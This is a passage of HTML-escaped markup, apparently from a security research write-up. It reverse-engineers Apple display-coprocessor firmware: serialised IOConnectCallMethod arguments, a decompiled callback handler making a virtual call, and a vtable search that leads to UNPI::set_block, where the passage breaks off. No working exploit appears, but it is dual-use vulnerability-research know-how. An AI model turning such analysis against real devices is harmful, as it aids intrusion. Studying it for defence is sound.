class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;ret &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;handler_fptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; meta&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; in_struct_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; in_struct_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; out_struct_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; out_struct_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;in_struct_ptr&lt;/span&gt;&lt;span&gt;&amp;nbsp;points to a copy of the serialised &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOConnectCallMethod&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;arguments we saw being serialized earlier on the application processor:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.a1bc79b6e0e53aa6513e954a3be969c86fa9de29\"&gt;&lt;/a&gt;&lt;a id=\"t.9\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;arg_struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;task&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;task&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp; u64 scalar_input_0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp; u64 scalar_input_1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; u64&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[]&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;remaining_scalar_inputs&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp; u32 cntExtraScalars&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; u8&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[]&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;structInput&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp; u64 cntStructInput&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The callback unpacks that buffer and calls a C++ virtual function:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.423c597cfa08d39f62002779d1150a8e593d7557\"&gt;&lt;/a&gt;&lt;a id=\"t.10\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;callback_handler_A435&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; u8&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;meta&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t args_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;out_struct_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp; uint32_t out_struct_size&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; int64 instance_id&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint64_t instance&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;err&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;retval&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;result&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c10\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; instance_id &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;meta&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;instance_id&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; instance &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; global_instance_table&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;instance_id&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;].&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;IOMobileFramebufferType&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;if&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;!&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;instance &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; log_fatal&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;\"IOMFB: %s: no instance for instance ID: %u\\n\"&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;\"static T *IOMFB::InstanceTracker::instance\"&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;\"(IOMFB::InstanceTracker::tracked_entity_t, uint32_t)\"&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;\" [T = IOMobileFramebuffer]\"&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; instance_id&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; err &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1 HovzfPYjjR-c11\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c11\"&gt;instance&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1 HovzfPYjjR-c11\"&gt;-&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4 HovzfPYjjR-c11\"&gt;16&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1 HovzfPYjjR-c11\"&gt;)-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c11\"&gt;vtable_0x378&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c30\"&gt;// virtual call&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;instance&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;16&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;),&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;task&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;scalar_input_0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;scalar_input_1&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;cntExtraScalars&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structInput&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;cntStructInput&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c10\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; retval &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;convert_error&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;err&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; result &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_DWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;out_struct_ptr &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;retval&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;result&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The challenge here is to figure out where&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c11\"&gt;that virtual call&lt;/span&gt;&lt;span&gt;&amp;nbsp;goes&lt;/span&gt;&lt;span&gt;. The object is being looked up in a global table based on the instance id. We can't just set a breakpoint and whilst emulating the firmware is probably possible that would likely be a long project in itself. I took a hackier approach: we know that the vtable needs to be at least &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x380&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;bytes large so just go through all those vtables, decompile them and see if the prototypes look reasonable!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;There's one clear match in the vtable for the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UNPI&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;type:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.ac38f56155b7d2697b0aee9ae6858f6b42815b34\"&gt;&lt;/a&gt;&lt;a id=\"t.11\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;UNPI&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;set_block&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; UNPI&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;task&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;caller_task_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;first_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;second_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span 